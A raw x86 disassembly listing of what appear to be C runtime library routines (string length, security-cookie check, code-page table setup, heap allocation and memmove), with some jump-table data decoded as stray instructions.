  423f73:	je     0x423fc3
  423f75:	test   ecx,0x3
  423f7b:	jne    0x423f6c
  423f7d:	add    eax,0x0
  423f82:	lea    esp,[esp+0x0]
  423f89:	lea    esp,[esp+0x0]
  423f90:	mov    eax,DWORD PTR [ecx]
  423f92:	mov    edx,0x7efefeff
  423f97:	add    edx,eax
  423f99:	xor    eax,0xffffffff
  423f9c:	xor    eax,edx
  423f9e:	add    ecx,0x4
  423fa1:	test   eax,0x81010100
  423fa6:	je     0x423f90
  423fa8:	mov    eax,DWORD PTR [ecx-0x4]
  423fab:	test   al,al
  423fad:	je     0x423fe1
  423faf:	test   ah,ah
  423fb1:	je     0x423fd7
  423fb3:	test   eax,0xff0000
  423fb8:	je     0x423fcd
  423fba:	test   eax,0xff000000
  423fbf:	je     0x423fc3
  423fc1:	jmp    0x423f90
  423fc3:	lea    eax,[ecx-0x1]
  423fc6:	mov    ecx,DWORD PTR [esp+0x4]
  423fca:	sub    eax,ecx
  423fcc:	ret    
  423fcd:	lea    eax,[ecx-0x2]
  423fd0:	mov    ecx,DWORD PTR [esp+0x4]
  423fd4:	sub    eax,ecx
  423fd6:	ret    
  423fd7:	lea    eax,[ecx-0x3]
  423fda:	mov    ecx,DWORD PTR [esp+0x4]
  423fde:	sub    eax,ecx
  423fe0:	ret    
  423fe1:	lea    eax,[ecx-0x4]
  423fe4:	mov    ecx,DWORD PTR [esp+0x4]
  423fe8:	sub    eax,ecx
  423fea:	ret    
  423feb:	push   0x8
  423fed:	push   0x428598
  423ff2:	call   0x423950
  423ff7:	and    DWORD PTR [ebp-0x4],0x0
  423ffb:	push   0x0
  423ffd:	push   0x1
  423fff:	call   0x425b72
  424004:	pop    ecx
  424005:	pop    ecx
  424006:	jmp    0x42400f
  424008:	xor    eax,eax
  42400a:	inc    eax
  42400b:	ret    
  42400c:	mov    esp,DWORD PTR [ebp-0x18]
  42400f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424013:	push   0x3
  424015:	call   DWORD PTR ds:0x42806c
  42401b:	int3   
  42401c:	cmp    ecx,DWORD PTR ds:0x4646c0
  424022:	jne    0x424025
  424024:	ret    
  424025:	jmp    0x423feb
  42402a:	movzx  eax,BYTE PTR [esp+0x4]
  42402f:	mov    cl,BYTE PTR [esp+0xc]
  424033:	test   BYTE PTR [eax+0x4651c1],cl
  424039:	jne    0x424057
  42403b:	cmp    DWORD PTR [esp+0x8],0x0
  424040:	je     0x424050
  424042:	movzx  eax,WORD PTR [eax*2+0x428992]
  42404a:	and    eax,DWORD PTR [esp+0x8]
  42404e:	jmp    0x424052
  424050:	xor    eax,eax
  424052:	test   eax,eax
  424054:	jne    0x424057
  424056:	ret    
  424057:	xor    eax,eax
  424059:	inc    eax
  42405a:	ret    
  42405b:	push   0x4
  42405d:	push   0x0
  42405f:	push   DWORD PTR [esp+0xc]
  424063:	call   0x42402a
  424068:	add    esp,0xc
  42406b:	ret    
  42406c:	sub    eax,0x3a4
  424071:	je     0x424095
  424073:	sub    eax,0x4
  424076:	je     0x42408f
  424078:	sub    eax,0xd
  42407b:	je     0x424089
  42407d:	dec    eax
  42407e:	je     0x424083
  424080:	xor    eax,eax
  424082:	ret    
  424083:	mov    eax,0x404
  424088:	ret    
  424089:	mov    eax,0x412
  42408e:	ret    
  42408f:	mov    eax,0x804
  424094:	ret    
  424095:	mov    eax,0x411
  42409a:	ret    
  42409b:	push   edi
  42409c:	push   0x40
  42409e:	xor    eax,eax
  4240a0:	pop    ecx
  4240a1:	mov    edi,0x4651c0
  4240a6:	rep stos DWORD PTR es:[edi],eax
  4240a8:	stos   BYTE PTR es:[edi],al
  4240a9:	xor    eax,eax
  4240ab:	mov    ds:0x4652c4,eax
  4240b0:	mov    ds:0x4651bc,eax
  4240b5:	mov    ds:0x4651b4,eax
  4240ba:	mov    edi,0x4652d0
  4240bf:	stos   DWORD PTR es:[edi],eax
  4240c0:	stos   DWORD PTR es:[edi],eax
  4240c1:	stos   DWORD PTR es:[edi],eax
  4240c2:	pop    edi
  4240c3:	ret    
  4240c4:	push   ebp
  4240c5:	mov    ebp,esp
  4240c7:	sub    esp,0x518
  4240cd:	mov    eax,ds:0x4646c0
  4240d2:	xor    eax,DWORD PTR [ebp+0x4]
  4240d5:	push   esi
  4240d6:	mov    DWORD PTR [ebp-0x4],eax
  4240d9:	lea    eax,[ebp-0x18]
  4240dc:	push   eax
  4240dd:	push   DWORD PTR ds:0x4652c4
  4240e3:	call   DWORD PTR ds:0x4280e0
  4240e9:	cmp    eax,0x1
  4240ec:	mov    esi,0x100
  4240f1:	jne    0x424204
  4240f7:	xor    eax,eax
  4240f9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424100:	inc    eax
  424101:	cmp    eax,esi
  424103:	jb     0x4240f9
  424105:	mov    al,BYTE PTR [ebp-0x12]
  424108:	test   al,al
  42410a:	mov    BYTE PTR [ebp-0x118],0x20
  424111:	je     0x424149
  424113:	push   ebx
  424114:	lea    edx,[ebp-0x11]
  424117:	push   edi
  424118:	movzx  ecx,BYTE PTR [edx]
  42411b:	movzx  eax,al
  42411e:	cmp    eax,ecx
  424120:	ja     0x42413f
  424122:	sub    ecx,eax
  424124:	inc    ecx
  424125:	mov    ebx,ecx
  424127:	shr    ecx,0x2
  42412a:	lea    edi,[ebp+eax*1-0x118]
  424131:	mov    eax,0x20202020
  424136:	rep stos DWORD PTR es:[edi],eax
  424138:	mov    ecx,ebx
  42413a:	and    ecx,0x3
  42413d:	rep stos BYTE PTR es:[edi],al
  42413f:	inc    edx
  424140:	mov    al,BYTE PTR [edx]
  424142:	inc    edx
  424143:	test   al,al
  424145:	jne    0x424118
  424147:	pop    edi
  424148:	pop    ebx
  424149:	push   0x0
  42414b:	push   DWORD PTR ds:0x4651b4
  424151:	lea    eax,[ebp-0x518]
  424157:	push   DWORD PTR ds:0x4652c4
  42415d:	push   eax
  42415e:	push   esi
  42415f:	lea    eax,[ebp-0x118]
  424165:	push   eax
  424166:	push   0x1
  424168:	call   0x426078
  42416d:	push   0x0
  42416f:	push   DWORD PTR ds:0x4652c4
  424175:	lea    eax,[ebp-0x218]
  42417b:	push   esi
  42417c:	push   eax
  42417d:	push   esi
  42417e:	lea    eax,[ebp-0x118]
  424184:	push   eax
  424185:	push   esi
  424186:	push   DWORD PTR ds:0x4651b4
  42418c:	call   0x425cbc
  424191:	push   0x0
  424193:	push   DWORD PTR ds:0x4652c4
  424199:	lea    eax,[ebp-0x318]
  42419f:	push   esi
  4241a0:	push   eax
  4241a1:	push   esi
  4241a2:	lea    eax,[ebp-0x118]
  4241a8:	push   eax
  4241a9:	push   0x200
  4241ae:	push   DWORD PTR ds:0x4651b4
  4241b4:	call   0x425cbc
  4241b9:	add    esp,0x5c
  4241bc:	xor    eax,eax
  4241be:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4241c6:	test   cl,0x1
  4241c9:	je     0x4241e1
  4241cb:	or     BYTE PTR [eax+0x4651c1],0x10
  4241d2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4241d9:	mov    BYTE PTR [eax+0x4652e0],cl
  4241df:	jmp    0x4241fd
  4241e1:	test   cl,0x2
  4241e4:	je     0x4241f6
  4241e6:	or     BYTE PTR [eax+0x4651c1],0x20
  4241ed:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  4241f4:	jmp    0x4241d9
  4241f6:	and    BYTE PTR [eax+0x4652e0],0x0
  4241fd:	inc    eax
  4241fe:	cmp    eax,esi
  424200:	jb     0x4241be
  424202:	jmp    0x424248
  424204:	xor    eax,eax
  424206:	cmp    eax,0x41
  424209:	jb     0x424224
  42420b:	cmp    eax,0x5a
  42420e:	ja     0x424224
  424210:	or     BYTE PTR [eax+0x4651c1],0x10
  424217:	mov    cl,al
  424219:	add    cl,0x20
  42421c:	mov    BYTE PTR [eax+0x4652e0],cl
  424222:	jmp    0x424243
  424224:	cmp    eax,0x61
  424227:	jb     0x42423c
  424229:	cmp    eax,0x7a
  42422c:	ja     0x42423c
  42422e:	or     BYTE PTR [eax+0x4651c1],0x20
  424235:	mov    cl,al
  424237:	sub    cl,0x20
  42423a:	jmp    0x42421c
  42423c:	and    BYTE PTR [eax+0x4652e0],0x0
  424243:	inc    eax
  424244:	cmp    eax,esi
  424246:	jb     0x424206
  424248:	mov    ecx,DWORD PTR [ebp-0x4]
  42424b:	xor    ecx,DWORD PTR [ebp+0x4]
  42424e:	pop    esi
  42424f:	call   0x42401c
  424254:	leave  
  424255:	ret    
  424256:	push   ebp
  424257:	mov    ebp,esp
  424259:	sub    esp,0x1c
  42425c:	mov    eax,ds:0x4646c0
  424261:	xor    eax,DWORD PTR [ebp+0x4]
  424264:	push   ebx
  424265:	push   esi
  424266:	mov    esi,DWORD PTR [ebp+0x8]
  424269:	xor    ebx,ebx
  42426b:	cmp    esi,ebx
  42426d:	mov    DWORD PTR [ebp-0x4],eax
  424270:	push   edi
  424271:	je     0x4243cb
  424277:	xor    edx,edx
  424279:	xor    eax,eax
  42427b:	cmp    DWORD PTR [eax+0x4646d0],esi
  424281:	je     0x4242e8
  424283:	add    eax,0x30
  424286:	inc    edx
  424287:	cmp    eax,0xf0
  42428c:	jb     0x42427b
  42428e:	lea    eax,[ebp-0x1c]
  424291:	push   eax
  424292:	push   esi
  424293:	call   DWORD PTR ds:0x4280e0
  424299:	cmp    eax,0x1
  42429c:	jne    0x4243c3
  4242a2:	push   0x40
  4242a4:	xor    eax,eax
  4242a6:	cmp    DWORD PTR [ebp-0x1c],0x1
  4242aa:	pop    ecx
  4242ab:	mov    edi,0x4651c0
  4242b0:	rep stos DWORD PTR es:[edi],eax
  4242b2:	stos   BYTE PTR es:[edi],al
  4242b3:	mov    DWORD PTR ds:0x4652c4,esi
  4242b9:	mov    DWORD PTR ds:0x4651b4,ebx
  4242bf:	jbe    0x4243b1
  4242c5:	cmp    BYTE PTR [ebp-0x16],0x0
  4242c9:	je     0x424389
  4242cf:	lea    ecx,[ebp-0x15]
  4242d2:	mov    dl,BYTE PTR [ecx]
  4242d4:	test   dl,dl
  4242d6:	je     0x424389
  4242dc:	movzx  eax,BYTE PTR [ecx-0x1]
  4242e0:	movzx  edx,dl
  4242e3:	jmp    0x424379
  4242e8:	push   0x40
  4242ea:	xor    eax,eax
  4242ec:	pop    ecx
  4242ed:	mov    edi,0x4651c0
  4242f2:	rep stos DWORD PTR es:[edi],eax
  4242f4:	lea    ecx,[edx+edx*2]
  4242f7:	shl    ecx,0x4
  4242fa:	mov    DWORD PTR [ebp-0x8],ebx
  4242fd:	stos   BYTE PTR es:[edi],al
  4242fe:	lea    ebx,[ecx+0x4646e0]
  424304:	mov    al,BYTE PTR [ebx]
  424306:	mov    esi,ebx
  424308:	jmp    0x424333
  42430a:	mov    dl,BYTE PTR [esi+0x1]
  42430d:	test   dl,dl
  42430f:	je     0x424337
  424311:	movzx  eax,al
  424314:	movzx  edi,dl
  424317:	cmp    eax,edi
  424319:	ja     0x42432f
  42431b:	mov    edx,DWORD PTR [ebp-0x8]
  42431e:	mov    dl,BYTE PTR [edx+0x4646c8]
  424324:	or     BYTE PTR [eax+0x4651c1],dl
  42432a:	inc    eax
  42432b:	cmp    eax,edi
  42432d:	jbe    0x424324
  42432f:	inc    esi
  424330:	inc    esi
  424331:	mov    al,BYTE PTR [esi]
  424333:	test   al,al
  424335:	jne    0x42430a
  424337:	inc    DWORD PTR [ebp-0x8]
  42433a:	add    ebx,0x8
  42433d:	cmp    DWORD PTR [ebp-0x8],0x4
  424341:	jb     0x424304
  424343:	mov    eax,DWORD PTR [ebp+0x8]
  424346:	mov    ds:0x4652c4,eax
  42434b:	mov    DWORD PTR ds:0x4651bc,0x1
  424355:	call   0x42406c
  42435a:	lea    ecx,[ecx+0x4646d4]
  424360:	mov    esi,ecx
  424362:	mov    edi,0x4652d0
  424367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424369:	mov    ds:0x4651b4,eax
  42436e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42436f:	jmp    0x4243d0
  424371:	or     BYTE PTR [eax+0x4651c1],0x4
  424378:	inc    eax
  424379:	cmp    eax,edx
  42437b:	jbe    0x424371
  42437d:	inc    ecx
  42437e:	inc    ecx
  42437f:	cmp    BYTE PTR [ecx-0x1],0x0
  424383:	jne    0x4242d2
  424389:	xor    ecx,ecx
  42438b:	inc    ecx
  42438c:	mov    eax,ecx
  42438e:	or     BYTE PTR [eax+0x4651c1],0x8
  424395:	inc    eax
  424396:	cmp    eax,0xff
  42439b:	jb     0x42438e
  42439d:	mov    eax,esi
  42439f:	call   0x42406c
  4243a4:	mov    ds:0x4651b4,eax
  4243a9:	mov    DWORD PTR ds:0x4651bc,ecx
  4243af:	jmp    0x4243b7
  4243b1:	mov    DWORD PTR ds:0x4651bc,ebx
  4243b7:	xor    eax,eax
  4243b9:	mov    edi,0x4652d0
  4243be:	stos   DWORD PTR es:[edi],eax
  4243bf:	stos   DWORD PTR es:[edi],eax
  4243c0:	stos   DWORD PTR es:[edi],eax
  4243c1:	jmp    0x4243d0
  4243c3:	cmp    DWORD PTR ds:0x465024,ebx
  4243c9:	je     0x4243d9
  4243cb:	call   0x42409b
  4243d0:	call   0x4240c4
  4243d5:	xor    eax,eax
  4243d7:	jmp    0x4243dc
  4243d9:	or     eax,0xffffffff
  4243dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4243df:	xor    ecx,DWORD PTR [ebp+0x4]
  4243e2:	pop    edi
  4243e3:	pop    esi
  4243e4:	pop    ebx
  4243e5:	call   0x42401c
  4243ea:	leave  
  4243eb:	ret    
  4243ec:	push   0x14
  4243ee:	push   0x4285a8
  4243f3:	call   0x423950
  4243f8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  4243fc:	push   0xd
  4243fe:	call   0x423b0f
  424403:	pop    ecx
  424404:	xor    edi,edi
  424406:	mov    DWORD PTR [ebp-0x4],edi
  424409:	mov    DWORD PTR ds:0x465024,edi
  42440f:	mov    eax,DWORD PTR [ebp+0x8]
  424412:	cmp    eax,0xfffffffe
  424415:	jne    0x424429
  424417:	mov    DWORD PTR ds:0x465024,0x1
  424421:	call   DWORD PTR ds:0x4280dc
  424427:	jmp    0x424454
  424429:	cmp    eax,0xfffffffd
  42442c:	jne    0x424440
  42442e:	mov    DWORD PTR ds:0x465024,0x1
  424438:	call   DWORD PTR ds:0x4280d8
  42443e:	jmp    0x424454
  424440:	cmp    eax,0xfffffffc
  424443:	jne    0x424454
  424445:	mov    DWORD PTR ds:0x465024,0x1
  42444f:	mov    eax,ds:0x465054
  424454:	mov    DWORD PTR [ebp+0x8],eax
  424457:	cmp    eax,DWORD PTR ds:0x4652c4
  42445d:	je     0x42451e
  424463:	mov    esi,DWORD PTR ds:0x4651b8
  424469:	mov    DWORD PTR [ebp-0x20],esi
  42446c:	cmp    esi,edi
  42446e:	je     0x424474
  424470:	cmp    DWORD PTR [esi],edi
  424472:	je     0x424484
  424474:	push   0x220
  424479:	call   0x424672
  42447e:	pop    ecx
  42447f:	mov    esi,eax
  424481:	mov    DWORD PTR [ebp-0x20],esi
  424484:	cmp    esi,edi
  424486:	je     0x424507
  424488:	push   DWORD PTR [ebp+0x8]
  42448b:	call   0x424256
  424490:	pop    ecx
  424491:	mov    DWORD PTR [ebp-0x1c],eax
  424494:	cmp    eax,edi
  424496:	jne    0x424507
  424498:	mov    DWORD PTR [esi],edi
  42449a:	mov    eax,ds:0x4652c4
  42449f:	mov    DWORD PTR [esi+0x4],eax
  4244a2:	mov    eax,ds:0x4651bc
  4244a7:	mov    DWORD PTR [esi+0x8],eax
  4244aa:	mov    eax,ds:0x4651b4
  4244af:	mov    DWORD PTR [esi+0xc],eax
  4244b2:	xor    eax,eax
  4244b4:	mov    DWORD PTR [ebp-0x24],eax
  4244b7:	cmp    eax,0x5
  4244ba:	jge    0x4244cc
  4244bc:	mov    cx,WORD PTR [eax*2+0x4652d0]
  4244c4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4244c9:	inc    eax
  4244ca:	jmp    0x4244b4
  4244cc:	xor    eax,eax
  4244ce:	mov    DWORD PTR [ebp-0x24],eax
  4244d1:	cmp    eax,0x101
  4244d6:	jge    0x4244e5
  4244d8:	mov    cl,BYTE PTR [eax+0x4651c0]
  4244de:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4244e2:	inc    eax
  4244e3:	jmp    0x4244ce
  4244e5:	xor    eax,eax
  4244e7:	mov    DWORD PTR [ebp-0x24],eax
  4244ea:	cmp    eax,0x100
  4244ef:	jge    0x424501
  4244f1:	mov    cl,BYTE PTR [eax+0x4652e0]
  4244f7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  4244fe:	inc    eax
  4244ff:	jmp    0x4244e7
  424501:	mov    DWORD PTR ds:0x4651b8,esi
  424507:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42450b:	jne    0x424521
  42450d:	cmp    esi,DWORD PTR ds:0x4651b8
  424513:	je     0x424521
  424515:	push   esi
  424516:	call   0x42455a
  42451b:	pop    ecx
  42451c:	jmp    0x424521
  42451e:	mov    DWORD PTR [ebp-0x1c],edi
  424521:	or     DWORD PTR [ebp-0x4],0xffffffff
  424525:	call   0x424533
  42452a:	mov    eax,DWORD PTR [ebp-0x1c]
  42452d:	call   0x42398b
  424532:	ret    
  424533:	push   0xd
  424535:	call   0x423a7b
  42453a:	pop    ecx
  42453b:	ret    
  42453c:	cmp    DWORD PTR ds:0x46550c,0x0
  424543:	jne    0x424557
  424545:	push   0xfffffffd
  424547:	call   0x4243ec
  42454c:	pop    ecx
  42454d:	mov    DWORD PTR ds:0x46550c,0x1
  424557:	xor    eax,eax
  424559:	ret    
  42455a:	push   0xc
  42455c:	push   0x4285b8
  424561:	call   0x423950
  424566:	mov    esi,DWORD PTR [ebp+0x8]
  424569:	test   esi,esi
  42456b:	je     0x4245c5
  42456d:	cmp    DWORD PTR ds:0x4653e4,0x3
  424574:	jne    0x4245b6
  424576:	push   0x4
  424578:	call   0x423b0f
  42457d:	pop    ecx
  42457e:	and    DWORD PTR [ebp-0x4],0x0
  424582:	push   esi
  424583:	call   0x424d32
  424588:	pop    ecx
  424589:	mov    DWORD PTR [ebp-0x1c],eax
  42458c:	test   eax,eax
  42458e:	je     0x424599
  424590:	push   esi
  424591:	push   eax
  424592:	call   0x424d5d
  424597:	pop    ecx
  424598:	pop    ecx
  424599:	or     DWORD PTR [ebp-0x4],0xffffffff
  42459d:	call   0x4245ad
  4245a2:	cmp    DWORD PTR [ebp-0x1c],0x0
  4245a6:	jne    0x4245c5
  4245a8:	push   DWORD PTR [ebp+0x8]
  4245ab:	jmp    0x4245b7
  4245ad:	push   0x4
  4245af:	call   0x423a7b
  4245b4:	pop    ecx
  4245b5:	ret    
  4245b6:	push   esi
  4245b7:	push   0x0
  4245b9:	push   DWORD PTR ds:0x4653e0
  4245bf:	call   DWORD PTR ds:0x4280c8
  4245c5:	call   0x42398b
  4245ca:	ret    
  4245cb:	push   0xc
  4245cd:	push   0x4285c8
  4245d2:	call   0x423950
  4245d7:	mov    esi,DWORD PTR [ebp+0x8]
  4245da:	cmp    DWORD PTR ds:0x4653e4,0x3
  4245e1:	jne    0x424611
  4245e3:	cmp    esi,DWORD PTR ds:0x4651a4
  4245e9:	ja     0x424611
  4245eb:	push   0x4
  4245ed:	call   0x423b0f
  4245f2:	pop    ecx
  4245f3:	and    DWORD PTR [ebp-0x4],0x0
  4245f7:	push   esi
  4245f8:	call   0x425511
  4245fd:	pop    ecx
  4245fe:	mov    DWORD PTR [ebp-0x1c],eax
  424601:	or     DWORD PTR [ebp-0x4],0xffffffff
  424605:	call   0x42463d
  42460a:	mov    eax,DWORD PTR [ebp-0x1c]
  42460d:	test   eax,eax
  42460f:	jne    0x424634
  424611:	test   esi,esi
  424613:	jne    0x424616
  424615:	inc    esi
  424616:	cmp    DWORD PTR ds:0x4653e4,0x1
  42461d:	je     0x424625
  42461f:	add    esi,0xf
  424622:	and    esi,0xfffffff0
  424625:	push   esi
  424626:	push   0x0
  424628:	push   DWORD PTR ds:0x4653e0
  42462e:	call   DWORD PTR ds:0x4280e4
  424634:	call   0x42398b
  424639:	ret    
  42463a:	mov    esi,DWORD PTR [ebp+0x8]
  42463d:	push   0x4
  42463f:	call   0x423a7b
  424644:	pop    ecx
  424645:	ret    
  424646:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42464b:	ja     0x42466f
  42464d:	push   DWORD PTR [esp+0x4]
  424651:	call   0x4245cb
  424656:	test   eax,eax
  424658:	pop    ecx
  424659:	jne    0x424671
  42465b:	cmp    DWORD PTR [esp+0x8],eax
  42465f:	je     0x424671
  424661:	push   DWORD PTR [esp+0x4]
  424665:	call   0x426232
  42466a:	test   eax,eax
  42466c:	pop    ecx
  42466d:	jne    0x42464d
  42466f:	xor    eax,eax
  424671:	ret    
  424672:	push   DWORD PTR ds:0x465068
  424678:	push   DWORD PTR [esp+0x8]
  42467c:	call   0x424646
  424681:	pop    ecx
  424682:	pop    ecx
  424683:	ret    
  424684:	int3   
  424685:	int3   
  424686:	int3   
  424687:	int3   
  424688:	int3   
  424689:	int3   
  42468a:	int3   
  42468b:	int3   
  42468c:	int3   
  42468d:	int3   
  42468e:	int3   
  42468f:	int3   
  424690:	push   ebp
  424691:	mov    ebp,esp
  424693:	push   edi
  424694:	push   esi
  424695:	mov    esi,DWORD PTR [ebp+0xc]
  424698:	mov    ecx,DWORD PTR [ebp+0x10]
  42469b:	mov    edi,DWORD PTR [ebp+0x8]
  42469e:	mov    eax,ecx
  4246a0:	mov    edx,ecx
  4246a2:	add    eax,esi
  4246a4:	cmp    edi,esi
  4246a6:	jbe    0x4246b0
  4246a8:	cmp    edi,eax
  4246aa:	jb     0x42482c
  4246b0:	test   edi,0x3
  4246b6:	jne    0x4246cc
  4246b8:	shr    ecx,0x2
  4246bb:	and    edx,0x3
  4246be:	cmp    ecx,0x8
  4246c1:	jb     0x4246ec
  4246c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c5:	jmp    DWORD PTR [edx*4+0x4247dc]
  4246cc:	mov    eax,edi
  4246ce:	mov    edx,0x3
  4246d3:	sub    ecx,0x4
  4246d6:	jb     0x4246e4
  4246d8:	and    eax,0x3
  4246db:	add    ecx,eax
  4246dd:	jmp    DWORD PTR [eax*4+0x4246f0]
  4246e4:	jmp    DWORD PTR [ecx*4+0x4247ec]
  4246eb:	nop
  4246ec:	jmp    DWORD PTR [ecx*4+0x424770]
  4246f3:	nop
  4246f4:	add    BYTE PTR [edi+0x42],al
  4246f7:	add    BYTE PTR [edi+eax*2],ch
  4246fa:	inc    edx
  4246fb:	add    BYTE PTR [eax+0x47],dl
  4246fe:	inc    edx
  4246ff:	add    BYTE PTR [ebx],ah
  424701:	ror    DWORD PTR [edx-0x75f877fa],1
  424707:	inc    esi
  424708:	add    DWORD PTR [eax+0x468a0147],ecx
  42470e:	add    al,cl
  424710:	jmp    0x289cf17
  424715:	add    esi,0x3
  424718:	add    edi,0x3
  42471b:	cmp    ecx,0x8
  42471e:	jb     0x4246ec
  424720:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424722:	jmp    DWORD PTR [edx*4+0x4247dc]
  424729:	lea    ecx,[ecx+0x0]
  42472c:	and    edx,ecx
  42472e:	mov    al,BYTE PTR [esi]
  424730:	mov    BYTE PTR [edi],al
  424732:	mov    al,BYTE PTR [esi+0x1]
  424735:	shr    ecx,0x2
  424738:	mov    BYTE PTR [edi+0x1],al
  42473b:	add    esi,0x2
  42473e:	add    edi,0x2
  424741:	cmp    ecx,0x8
  424744:	jb     0x4246ec
  424746:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424748:	jmp    DWORD PTR [edx*4+0x4247dc]
  42474f:	nop
  424750:	and    edx,ecx
  424752:	mov    al,BYTE PTR [esi]
  424754:	mov    BYTE PTR [edi],al
  424756:	add    esi,0x1
  424759:	shr    ecx,0x2
  42475c:	add    edi,0x1
  42475f:	cmp    ecx,0x8
  424762:	jb     0x4246ec
  424764:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424766:	jmp    DWORD PTR [edx*4+0x4247dc]
  42476d:	lea    ecx,[ecx+0x0]
  424770:	rol    DWORD PTR [edi+0x42],cl
  424773:	add    al,al
  424775:	inc    edi
  424776:	inc    edx
  424777:	add    BYTE PTR [eax-0x4fffbdb9],bh
  42477d:	inc    edi
  42477e:	inc    edx
  42477f:	add    BYTE PTR [eax-0x5fffbdb9],ch
  424785:	inc    edi
  424786:	inc    edx
  424787:	add    BYTE PTR [eax-0x6fffbdb9],bl
  42478d:	inc    edi
  42478e:	inc    edx
  42478f:	add    BYTE PTR [ebx-0x761b71bc],cl
  424795:	inc    esp
  424796:	(bad)  
  424797:	in     al,0x8b
  424799:	inc    esp
  42479a:	mov    gs,eax
  42479c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4247a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4247a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4247a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4247ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4247b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4247b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4247b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4247bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4247c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4247c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4247c8:	lea    eax,[ecx*4+0x0]
  4247cf:	add    esi,eax
  4247d1:	add    edi,eax
  4247d3:	jmp    DWORD PTR [edx*4+0x4247dc]
  4247da:	mov    edi,edi
  4247dc:	in     al,dx
  4247dd:	inc    edi
  4247de:	inc    edx
  4247df:	add    ah,dh
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],al
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax+ecx*2],dl
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4247f1:	leave  
  4247f2:	ret    
  4247f3:	nop
  4247f4:	mov    al,BYTE PTR [esi]
  4247f6:	mov    BYTE PTR [edi],al
  4247f8:	mov    eax,DWORD PTR [ebp+0x8]
  4247fb:	pop    esi
  4247fc:	pop    edi
  4247fd:	leave  
  4247fe:	ret    
  4247ff:	nop
  424800:	mov    al,BYTE PTR [esi]
  424802:	mov    BYTE PTR [edi],al
  424804:	mov    al,BYTE PTR [esi+0x1]
  424807:	mov    BYTE PTR [edi+0x1],al
  42480a:	mov    eax,DWORD PTR [ebp+0x8]
  42480d:	pop    esi
  42480e:	pop    edi
  42480f:	leave  
  424810:	ret    
  424811:	lea    ecx,[ecx+0x0]
  424814:	mov    al,BYTE PTR [esi]
  424816:	mov    BYTE PTR [edi],al
  424818:	mov    al,BYTE PTR [esi+0x1]
  42481b:	mov    BYTE PTR [edi+0x1],al
  42481e:	mov    al,BYTE PTR [esi+0x2]
  424821:	mov    BYTE PTR [edi+0x2],al
  424824:	mov    eax,DWORD PTR [ebp+0x8]
  424827:	pop    esi
  424828:	pop    edi
  424829:	leave  
  42482a:	ret    
  42482b:	nop
  42482c:	lea    esi,[ecx+esi*1-0x4]
  424830:	lea    edi,[ecx+edi*1-0x4]
  424834:	test   edi,0x3
  42483a:	jne    0x424860
  42483c:	shr    ecx,0x2
  42483f:	and    edx,0x3
  424842:	cmp    ecx,0x8
  424845:	jb     0x424854
  424847:	std    
  424848:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42484a:	cld    
  42484b:	jmp    DWORD PTR [edx*4+0x424978]
  424852:	mov    edi,edi
  424854:	neg    ecx
  424856:	jmp    DWORD PTR [ecx*4+0x424928]
  42485d:	lea    ecx,[ecx+0x0]
  424860:	mov    eax,edi
  424862:	mov    edx,0x3
  424867:	cmp    ecx,0x4
  42486a:	jb     0x424878
  42486c:	and    eax,0x3
  42486f:	sub    ecx,eax
  424871:	jmp    DWORD PTR [eax*4+0x42487c]
  424878:	jmp    DWORD PTR [ecx*4+0x424978]
  42487f:	nop
  424880:	mov    WORD PTR [eax+0x42],cs
  424883:	add    BYTE PTR [eax-0x27ffbdb8],dh
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [edx-0x2edcfcba],cl
  424891:	mov    BYTE PTR [edi+0x3],al
  424894:	sub    esi,0x1
  424897:	shr    ecx,0x2
  42489a:	sub    edi,0x1
  42489d:	cmp    ecx,0x8
  4248a0:	jb     0x424854
  4248a2:	std    
  4248a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248a5:	cld    
  4248a6:	jmp    DWORD PTR [edx*4+0x424978]
  4248ad:	lea    ecx,[ecx+0x0]
  4248b0:	mov    al,BYTE PTR [esi+0x3]
  4248b3:	and    edx,ecx
  4248b5:	mov    BYTE PTR [edi+0x3],al
  4248b8:	mov    al,BYTE PTR [esi+0x2]
  4248bb:	shr    ecx,0x2
  4248be:	mov    BYTE PTR [edi+0x2],al
  4248c1:	sub    esi,0x2
  4248c4:	sub    edi,0x2
  4248c7:	cmp    ecx,0x8
  4248ca:	jb     0x424854
  4248cc:	std    
  4248cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248cf:	cld    
  4248d0:	jmp    DWORD PTR [edx*4+0x424978]
  4248d7:	nop
  4248d8:	mov    al,BYTE PTR [esi+0x3]
